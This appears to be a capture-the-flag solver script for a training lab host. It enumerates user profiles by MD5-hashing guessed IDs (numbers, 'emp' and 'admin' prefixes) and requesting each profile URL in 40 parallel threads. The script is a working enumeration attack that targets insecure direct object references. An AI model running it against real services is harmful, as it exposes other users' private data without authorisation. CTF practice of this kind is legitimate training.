import requests
import hashlib
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "http://chatelaine.cylabacademy.net:46099"

found_flag = False

def check_id_str(val_str):
    global found_flag
    if found_flag:
        return
    h = hashlib.md5(val_str.encode()).hexdigest()
    try:
        r = requests.get(f"{BASE_URL}/profile/user/{h}", timeout=3)
        if r.status_code == 200:
            print(f"\n[+] ¡ÉXITO! ID string: '{val_str}' -> Status: {r.status_code}")
            print(f"[+] Contenido: {r.text}")
            if "academy{" in r.text or "picoctf{" in r.text or "flag" in r.text.lower():
                found_flag = True
                print("=" * 60)
                print(f"[!] FLAG ENCONTRADA EN '{val_str}':")
                print(r.text)
                print("=" * 60)
    except Exception:
        pass

candidates = []
# 1. Rangos directos
for i in range(0, 5000):
    candidates.append(str(i))
    candidates.append(f"{i:02d}")
    candidates.append(f"{i:03d}")
    candidates.append(f"{i:04d}")

# 2. Prefijos de empleados (emp1, emp01, employee1, admin, user1)
for prefix in ["emp", "EMP", "employee", "user", "admin", "e"]:
    for i in range(1, 30):
        candidates.append(f"{prefix}{i}")
        candidates.append(f"{prefix}_{i}")
        candidates.append(f"{prefix}{i:02d}")
        candidates.append(f"{prefix}_{i:02d}")

print(f"[*] Probando {len(candidates)} candidatos concurrentemente...")

with ThreadPoolExecutor(max_workers=40) as executor:
    executor.map(check_id_str, candidates)
